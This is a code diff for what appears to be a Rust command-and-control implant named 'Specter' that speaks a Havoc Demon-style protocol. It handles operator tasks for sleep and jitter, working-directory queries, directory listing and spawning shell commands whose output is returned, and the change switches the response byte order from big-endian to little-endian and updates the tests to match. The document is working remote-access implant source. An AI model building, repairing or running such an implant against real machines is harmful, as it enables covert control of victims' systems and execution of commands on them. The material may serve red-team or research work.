@@ -115,8 +115,8 @@ fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
     config.sleep_jitter = jitter.min(100);
 
     let mut out = Vec::with_capacity(8);
-    write_u32_be(&mut out, delay);
-    write_u32_be(&mut out, jitter);
+    write_u32_le(&mut out, delay);
+    write_u32_le(&mut out, jitter);
     DispatchResult::Respond(Response::new(DemonCommand::CommandSleep, out))
 }
 
@@ -158,7 +158,7 @@ fn handle_fs(payload: &[u8]) -> DispatchResult {
 
 /// `COMMAND_FS / GetPwd (9)` — return the current working directory.
 ///
-/// Outgoing payload (BE): `[9: u32][path: bytes (UTF-16LE null-terminated)]`
+/// Outgoing payload (LE): `[9: u32][path: bytes (UTF-16LE null-terminated)]`
 fn handle_fs_pwd(subcmd_raw: u32) -> DispatchResult {
     let path = match std::env::current_dir() {
         Ok(p) => p.display().to_string(),
@@ -171,15 +171,15 @@ fn handle_fs_pwd(subcmd_raw: u32) -> DispatchResult {
     info!(path = %path, "GetPwd");
 
     let mut out = Vec::new();
-    write_u32_be(&mut out, subcmd_raw);
-    write_utf16le_be(&mut out, &path);
+    write_u32_le(&mut out, subcmd_raw);
+    write_utf16le(&mut out, &path);
     DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
 }
 
 /// `COMMAND_FS / Cd (4)` — change the working directory.
 ///
 /// Incoming args (LE): `[path: bytes (UTF-16LE)]`
-/// Outgoing payload (BE): `[4: u32][path: bytes (UTF-16LE null-terminated)]`
+/// Outgoing payload (LE): `[4: u32][path: bytes (UTF-16LE null-terminated)]`
 fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let mut offset = 0;
     let path_bytes = match parse_bytes_le(rest, &mut offset) {
@@ -199,8 +199,8 @@ fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     }
 
     let mut out = Vec::new();
-    write_u32_be(&mut out, subcmd_raw);
-    write_utf16le_be(&mut out, &path_str);
+    write_u32_le(&mut out, subcmd_raw);
+    write_utf16le(&mut out, &path_str);
     DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
 }
 
@@ -321,30 +321,30 @@ fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let total_size: u64 = files.iter().filter(|(_, d, ..)| !d).map(|(_, _, s, ..)| *s).sum();
 
     let mut out = Vec::new();
-    write_u32_be(&mut out, subcmd_raw);
-    write_u32_be(&mut out, u32::from(file_explorer));
-    write_u32_be(&mut out, u32::from(list_only));
-    write_utf16le_be(&mut out, &dir_path);
-    write_u32_be(&mut out, 1); // success
+    write_u32_le(&mut out, subcmd_raw);
+    write_u32_le(&mut out, u32::from(file_explorer));
+    write_u32_le(&mut out, u32::from(list_only));
+    write_utf16le(&mut out, &dir_path);
+    write_u32_le(&mut out, 1); // success
 
     // Single directory group.
-    write_utf16le_be(&mut out, &dir_path);
-    write_u32_be(&mut out, num_files);
-    write_u32_be(&mut out, num_dirs);
+    write_utf16le(&mut out, &dir_path);
+    write_u32_le(&mut out, num_files);
+    write_u32_le(&mut out, num_dirs);
     if !list_only {
-        out.extend_from_slice(&total_size.to_be_bytes());
+        out.extend_from_slice(&total_size.to_le_bytes());
     }
 
     for (name, is_dir, size, day, month, year, minute, hour) in &files {
-        write_utf16le_be(&mut out, name);
+        write_utf16le(&mut out, name);
         if !list_only {
-            write_u32_be(&mut out, u32::from(*is_dir));
-            out.extend_from_slice(&size.to_be_bytes());
-            write_u32_be(&mut out, *day);
-            write_u32_be(&mut out, *month);
-            write_u32_be(&mut out, *year);
-            write_u32_be(&mut out, *minute);
-            write_u32_be(&mut out, *hour);
+            write_u32_le(&mut out, u32::from(*is_dir));
+            out.extend_from_slice(&size.to_le_bytes());
+            write_u32_le(&mut out, *day);
+            write_u32_le(&mut out, *month);
+            write_u32_le(&mut out, *year);
+            write_u32_le(&mut out, *minute);
+            write_u32_le(&mut out, *hour);
         }
     }
 
@@ -454,19 +454,19 @@ fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let (success, pid, output_bytes) = spawn_shell_command(&process_path, &process_args_raw);
 
     // Response 1: COMMAND_PROC with process metadata
-    // BE format: [subcmd][path bytes][pid][success][piped][verbose]
+    // LE format: [subcmd][path bytes][pid][success][piped][verbose]
     let mut proc_payload = Vec::new();
-    write_u32_be(&mut proc_payload, subcmd_raw);
-    write_utf16le_be(&mut proc_payload, &process_path);
-    write_u32_be(&mut proc_payload, pid);
-    write_u32_be(&mut proc_payload, u32::from(success));
-    write_u32_be(&mut proc_payload, piped);
-    write_u32_be(&mut proc_payload, verbose);
+    write_u32_le(&mut proc_payload, subcmd_raw);
+    write_utf16le(&mut proc_payload, &process_path);
+    write_u32_le(&mut proc_payload, pid);
+    write_u32_le(&mut proc_payload, u32::from(success));
+    write_u32_le(&mut proc_payload, piped);
+    write_u32_le(&mut proc_payload, verbose);
 
     // Response 2: COMMAND_OUTPUT with captured output
-    // BE format: [output bytes (UTF-8, length-prefixed)]
+    // LE format: [output bytes (UTF-8, length-prefixed)]
     let mut out_payload = Vec::new();
-    write_bytes_be(&mut out_payload, &output_bytes);
+    write_bytes_le(&mut out_payload, &output_bytes);
 
     DispatchResult::MultiRespond(vec![
         Response::new(DemonCommand::CommandProc, proc_payload),
@@ -1487,11 +1487,14 @@ fn decode_utf16le_null(bytes: &[u8]) -> String {
 // Used by the existing Sleep, Fs, and Exec callbacks which pre-date the LE fix.
 
 /// Append a `u32` in big-endian byte order.
+#[cfg(test)]
+#[allow(dead_code)]
 fn write_u32_be(buf: &mut Vec<u8>, v: u32) {
     buf.extend_from_slice(&v.to_be_bytes());
 }
 
 /// Append a length-prefixed byte slice: `[u32 BE length][bytes…]`.
+#[cfg(test)]
 fn write_bytes_be(buf: &mut Vec<u8>, data: &[u8]) {
     #[allow(clippy::cast_possible_truncation)]
     let len = data.len() as u32;
@@ -1500,12 +1503,13 @@ fn write_bytes_be(buf: &mut Vec<u8>, data: &[u8]) {
 }
 
 /// Append a `u64` pointer in big-endian byte order (8 bytes).
-#[allow(dead_code)]
+#[cfg(test)]
 fn write_ptr_be(buf: &mut Vec<u8>, v: u64) {
     buf.extend_from_slice(&v.to_be_bytes());
 }
 
 /// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 BE length][bytes…]`.
+#[cfg(test)]
 fn write_utf16le_be(buf: &mut Vec<u8>, s: &str) {
     let utf16: Vec<u8> =
         s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
@@ -1711,9 +1715,9 @@ mod tests {
             panic!("expected Respond, got {result:?}");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSleep));
-        // Payload: [3000 BE][25 BE]
-        let expected_delay = 3000u32.to_be_bytes();
-        let expected_jitter = 25u32.to_be_bytes();
+        // Payload: [3000 LE][25 LE]
+        let expected_delay = 3000u32.to_le_bytes();
+        let expected_jitter = 25u32.to_le_bytes();
         assert_eq!(&resp.payload[0..4], &expected_delay);
         assert_eq!(&resp.payload[4..8], &expected_jitter);
     }
@@ -1749,8 +1753,8 @@ mod tests {
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
 
-        // First 4 bytes BE = subcommand (9)
-        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        // First 4 bytes LE = subcommand (9)
+        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
         assert_eq!(subcmd, 9);
 
         // Remaining = length-prefixed UTF-16LE path
@@ -1775,11 +1779,11 @@ mod tests {
             panic!("expected Respond, got {result:?}");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
-        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
+        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("subcmd"));
         assert_eq!(subcmd, 4);
 
         // Decode echoed path from response
-        let path_len = u32::from_be_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
+        let path_len = u32::from_le_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
         let decoded = decode_utf16le_null(&resp.payload[8..8 + path_len]);
         assert_eq!(decoded, tmp_str);
     }
@@ -1828,34 +1832,34 @@ mod tests {
         // Parse the response header.
         let p = &resp.payload;
         let mut pos = 0usize;
-        let _subcmd = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("subcmd"));
+        let _subcmd = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("subcmd"));
         pos += 4;
-        let _file_explorer = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("fe"));
+        let _file_explorer = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("fe"));
         pos += 4;
-        let list_only_flag = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("lo"));
+        let list_only_flag = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("lo"));
         pos += 4;
         assert_eq!(list_only_flag, 1, "list_only must be echoed as 1");
 
-        // Skip root_path (BE length-prefixed utf16le).
-        let path_len = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("plen")) as usize;
+        // Skip root_path (LE length-prefixed utf16le).
+        let path_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("plen")) as usize;
         pos += 4 + path_len;
-        let success = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("success"));
+        let success = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("success"));
         assert_eq!(success, 1);
         pos += 4;
 
         // Dir group: dir_path, num_files, num_dirs — but NO total_size.
-        let gpath_len = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("gpath")) as usize;
+        let gpath_len = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("gpath")) as usize;
         pos += 4 + gpath_len;
-        let _num_files = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("nf"));
+        let _num_files = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("nf"));
         pos += 4;
-        let _num_dirs = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("nd"));
+        let _num_dirs = u32::from_le_bytes(p[pos..pos + 4].try_into().expect("nd"));
         pos += 4;
         // In list_only mode the next field should be the first entry name, NOT a u64 total_size.
         // The remaining bytes must all be name-only entries (no is_dir/size/timestamps).
         // Just verify we can parse all remaining entries as utf16le strings without going OOB.
         while pos < p.len() {
             let name_len =
-                u32::from_be_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
+                u32::from_le_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
             pos += 4 + name_len;
         }
         assert_eq!(pos, p.len(), "no trailing bytes; each entry must be exactly a name");
@@ -1881,16 +1885,16 @@ mod tests {
         // Parse to the first entry and check the year field.
         let p = &resp.payload;
         let mut pos = 4 + 4 + 4; // subcmd + file_explorer + list_only
-        let root_path_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
+        let root_path_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
         pos += 4 + root_path_len + 4; // skip root_path + success
-        let gpath_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
+        let gpath_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
         pos += 4 + gpath_len + 4 + 4 + 8; // skip group path + num_files + num_dirs + total_size
 
         // Find the entry for our test file and read its year (offset 4+2+4+8+4+4 from name start).
         let test_name = "specter_ts_test.tmp";
         let mut found = false;
         while pos < p.len() {
-            let name_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
+            let name_len = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
             pos += 4;
             let name_utf16: Vec<u16> = p[pos..pos + name_len]
                 .chunks_exact(2)
@@ -1902,11 +1906,11 @@ mod tests {
                 .collect();
             pos += name_len;
             // is_dir(4) + size(8) + day(4) + month(4) + year(4) + minute(4) + hour(4) = 32
-            let _is_dir = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap());
-            let _size = u64::from_be_bytes(p[pos + 4..pos + 12].try_into().unwrap());
-            let _day = u32::from_be_bytes(p[pos + 12..pos + 16].try_into().unwrap());
-            let _month = u32::from_be_bytes(p[pos + 16..pos + 20].try_into().unwrap());
-            let year = u32::from_be_bytes(p[pos + 20..pos + 24].try_into().unwrap());
+            let _is_dir = u32::from_le_bytes(p[pos..pos + 4].try_into().unwrap());
+            let _size = u64::from_le_bytes(p[pos + 4..pos + 12].try_into().unwrap());
+            let _day = u32::from_le_bytes(p[pos + 12..pos + 16].try_into().unwrap());
+            let _month = u32::from_le_bytes(p[pos + 16..pos + 20].try_into().unwrap());
+            let year = u32::from_le_bytes(p[pos + 20..pos + 24].try_into().unwrap());
             pos += 32;
             if name == test_name {
                 // The year must be >= 2024 (the file was just created).
@@ -1957,9 +1961,9 @@ mod tests {
         assert_eq!(resps[1].command_id, u32::from(DemonCommand::CommandOutput));
 
         // The output payload should contain "hello"
-        // payload[0..4] = BE length, payload[4..] = output bytes
+        // payload[0..4] = LE length, payload[4..] = output bytes
         let out_payload = &resps[1].payload;
-        let out_len = u32::from_be_bytes(out_payload[0..4].try_into().expect("len")) as usize;
+        let out_len = u32::from_le_bytes(out_payload[0..4].try_into().expect("len")) as usize;
         let out_str = std::str::from_utf8(&out_payload[4..4 + out_len])
             .expect("utf8 output")
             .trim()
@@ -1986,13 +1990,13 @@ mod tests {
         };
 
         // Parse the proc payload to extract the PID field.
-        // Format: [subcmd: u32 BE][path: u32 BE len + utf16le bytes][pid: u32 BE][...]
+        // Format: [subcmd: u32 LE][path: u32 LE len + utf16le bytes][pid: u32 LE][...]
         let proc_payload = &resps[0].payload;
         // Skip subcmd (4 bytes), then read the path length to skip the path.
         let path_len =
-            u32::from_be_bytes(proc_payload[4..8].try_into().expect("path len")) as usize;
+            u32::from_le_bytes(proc_payload[4..8].try_into().expect("path len")) as usize;
         let pid_offset = 4 + 4 + path_len;
-        let reported_pid = u32::from_be_bytes(
+        let reported_pid = u32::from_le_bytes(
             proc_payload[pid_offset..pid_offset + 4].try_into().expect("pid bytes"),
         );
 
